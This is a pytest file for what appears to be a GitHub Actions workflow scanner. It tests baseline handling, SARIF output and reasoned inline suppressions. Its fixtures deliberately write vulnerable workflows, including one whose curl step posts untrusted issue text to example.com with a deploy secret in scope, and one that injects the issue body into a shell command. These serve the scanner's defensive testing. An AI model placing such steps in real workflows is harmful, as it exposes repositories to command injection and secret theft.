"""The ratchet: run 2 must be quiet, and run 3 must catch what run 2 added."""

from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest
from conftest import run_cli

SOURCE = "tests/fixtures/malicious/comment-and-control"


@pytest.fixture
def repo(tmp_path):
    target = tmp_path / "repo"
    shutil.copytree(SOURCE, target)
    return target


def test_round_trip_makes_the_second_run_green(repo, repo_root):
    first = run_cli([str(repo)], cwd=repo_root)
    assert first.returncode == 1

    written = run_cli([str(repo), "--write-baseline", str(repo / ".tridelphi-baseline.json")], cwd=repo_root)
    assert written.returncode == 0

    second = run_cli([str(repo)], cwd=repo_root)
    assert second.returncode == 0, second.stdout


def test_new_finding_after_baseline_fails(repo, repo_root):
    run_cli([str(repo), "--write-baseline", str(repo / ".tridelphi-baseline.json")], cwd=repo_root)

    workflow = repo / ".github/workflows/extra.yml"
    workflow.write_text(
        "on: issues\n"
        "jobs:\n"
        "  leak:\n"
        "    runs-on: ubuntu-latest\n"
        "    permissions:\n"
        "      contents: write\n"
        "    steps:\n"
        "      - run: curl -d \"${{ github.event.issue.body }}\" https://example.com\n"
        "        env:\n"
        "          T: ${{ secrets.DEPLOY }}\n",
        encoding="utf-8",
    )
    result = run_cli([str(repo)], cwd=repo_root)
    assert result.returncode == 1


def test_baseline_state_appears_in_sarif(repo, repo_root):
    baseline = repo / ".tridelphi-baseline.json"
    run_cli([str(repo), "--write-baseline", str(baseline)], cwd=repo_root)
    result = run_cli([str(repo), "--format", "sarif"], cwd=repo_root)
    document = json.loads(result.stdout)
    states = {r.get("baselineState") for r in document["runs"][0]["results"]}
    assert states == {"unchanged"}


def test_no_baseline_flag_ignores_the_file(repo, repo_root):
    run_cli([str(repo), "--write-baseline", str(repo / ".tridelphi-baseline.json")], cwd=repo_root)
    assert run_cli([str(repo), "--no-baseline"], cwd=repo_root).returncode == 1


def test_corrupt_baseline_does_not_crash(repo, repo_root):
    (repo / ".tridelphi-baseline.json").write_text("{not json", encoding="utf-8")
    assert run_cli([str(repo)], cwd=repo_root).returncode == 1


def test_inline_suppression_requires_a_reason(repo_root, tmp_path):
    from tridelphi.api import analyze

    workflows = tmp_path / ".github/workflows"
    workflows.mkdir(parents=True)
    body = (
        "on: issues\n"
        "jobs:\n"
        "  a:{comment}\n"
        "    runs-on: ubuntu-latest\n"
        "    permissions:\n"
        "      contents: write\n"
        "    steps:\n"
        "      - run: ./s.sh \"${{{{ github.event.issue.body }}}}\"\n"
    )

    (workflows / "w.yml").write_text(body.format(comment=""), encoding="utf-8")
    assert analyze(tmp_path).findings

    # A bare `ignore` with no reason must not suppress: an exception a reviewer
    # cannot evaluate is a hole, not an exception.
    (workflows / "w.yml").write_text(
        body.format(comment="  # tridelphi: ignore u-p-e-intersection"), encoding="utf-8"
    )
    assert analyze(tmp_path).findings

    (workflows / "w.yml").write_text(
        body.format(
            comment="  # tridelphi: ignore expression-injection-privileged — runs only on protected tags, SEC-114"
        ),
        encoding="utf-8",
    )
    result = analyze(tmp_path)
    assert not [f for f in result.findings if f.severity == "critical"]
    assert result.suppressed == 1
